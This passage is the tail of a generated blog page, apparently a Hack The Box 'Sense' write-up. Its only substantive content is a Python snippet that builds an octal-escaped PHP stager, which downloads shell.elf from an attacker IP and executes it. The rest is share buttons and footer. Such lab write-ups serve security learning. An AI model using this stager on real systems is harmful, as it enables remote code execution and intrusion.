+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">stager <span style="color:#ff79c6">=</span> (
+<span style="color:#f1fa8c">&#39;echo </span><span style="color:#f1fa8c">\&#39;</span><span style="color:#f1fa8c">&lt;?php $shell =file_get_contents(&#34;http://10.10.14.38/shell.elf&#34;);&#39;</span> <span style="color:#ff79c6">+</span>
+<span style="color:#f1fa8c">&#39;file_put_contents(&#34;myshell.elf&#34;, $shell);&#39;</span> <span style="color:#ff79c6">+</span>
+<span style="color:#f1fa8c">&#39;system(&#34;chmod 755 myshell.elf &amp;&amp; ./myshell.elf&#34;); ?&gt; </span><span style="color:#f1fa8c">\&#39;</span><span style="color:#f1fa8c"> &gt; shellexec&#39;</span>
+)
+encoded_stager <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
+<span style="color:#ff79c6">for</span> c <span style="color:#ff79c6">in</span> stager:
+  encoded_stager <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\\\\</span><span style="color:#f1fa8c">%03d</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">%</span>(<span style="color:#8be9fd;font-style:italic">int</span>(<span style="color:#8be9fd;font-style:italic">oct</span>(<span style="color:#8be9fd;font-style:italic">ord</span>(c))))
+<span style="color:#8be9fd;font-style:italic">print</span> (encoded_stager)
+</code></pre></td></tr></table>
+</div>
+</div>
+      </div>
+    </article>
+
+    <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2f0xade1.github.io%2f%24DEV_BASEURL%2fposts%2f2020%2f09%2fhtb-sense%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2f0xade1.github.io%2f%24DEV_BASEURL%2fposts%2f2020%2f09%2fhtb-sense%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=HTB%20-%20Sense&amp;caption=HTB%20-%20Sense&amp;canonicalUrl=https%3a%2f%2f0xade1.github.io%2f%24DEV_BASEURL%2fposts%2f2020%2f09%2fhtb-sense%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=HTB%20-%20Sense&amp;body=https%3a%2f%2f0xade1.github.io%2f%24DEV_BASEURL%2fposts%2f2020%2f09%2fhtb-sense%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2f0xade1.github.io%2f%24DEV_BASEURL%2fposts%2f2020%2f09%2fhtb-sense%2f&amp;media=https%3a%2f%2f0xade1.github.io%2f%24DEV_BASEURL%2fposts%2f2020%2f09%2fhtb-sense%2f;description=HTB%20-%20Sense" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2f0xade1.github.io%2f%24DEV_BASEURL%2fposts%2f2020%2f09%2fhtb-sense%2f&amp;title=HTB%20-%20Sense&amp;summary=HTB%20-%20Sense&amp;source=https%3a%2f%2f0xade1.github.io%2f%24DEV_BASEURL%2fposts%2f2020%2f09%2fhtb-sense%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2f0xade1.github.io%2f%24DEV_BASEURL%2fposts%2f2020%2f09%2fhtb-sense%2f&amp;resubmit=true&amp;title=HTB%20-%20Sense" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2f0xade1.github.io%2f%24DEV_BASEURL%2fposts%2f2020%2f09%2fhtb-sense%2f;title=HTB%20-%20Sense" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=HTB%20-%20Sense%20https%3a%2f%2f0xade1.github.io%2f%24DEV_BASEURL%2fposts%2f2020%2f09%2fhtb-sense%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f0xade1.github.io%2f%24DEV_BASEURL%2fposts%2f2020%2f09%2fhtb-sense%2f&amp;t=HTB%20-%20Sense" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=HTB%20-%20Sense&amp;url=https%3a%2f%2f0xade1.github.io%2f%24DEV_BASEURL%2fposts%2f2020%2f09%2fhtb-sense%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+          <hr />
+
+    
+      <div class="pagination">
+        <div class="pagination__title">
+          <span class="pagination__title-h"></span>
+        </div>
+
+        <div class="pagination__buttons">
+          
+            <a href="https://0xade1.github.io/$DEV_BASEURL/posts/2020/09/htb-nibbles/" class="button previous">
+                <span class="button__icon">←</span>
+                <span class="button__text">HTB - Nibbles</span>
+            </a>
+          
+
+          
+            <a href="https://0xade1.github.io/$DEV_BASEURL/posts/2020/09/htb-admirer/" class="button next">
+                <span class="button__text">HTB - Admirer</span>
+                <span class="button__icon">→</span>
+            </a>
+          
+        </div>
+      </div>
+    
+
+      <hr />
+
+        
+
+
+
+
+
+
+
+
+
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2021</span>
+            
+            <span><a href="https://0xade1.github.io/$DEV_BASEURL/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084;</span>
+          </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://0xade1.github.io/$DEV_BASEURL/bundle.min.7015b843bafc394b6094818242f153559f5ca94b331b9faaf6132652c59619aefe60ae36e1637f7ee14fd953892639f466c25095c36d42203a1c195313e93212.js" integrity="sha512-cBW4Q7r8OUtglIGCQvFTVZ9cqUszG5&#43;q9hMmUsWWGa7&#43;YK424WN/fuFP2VOJJjn0ZsJQlcNtQiA6HBlTE&#43;kyEg=="></script>
+
+
+
+    </body>
+</html>
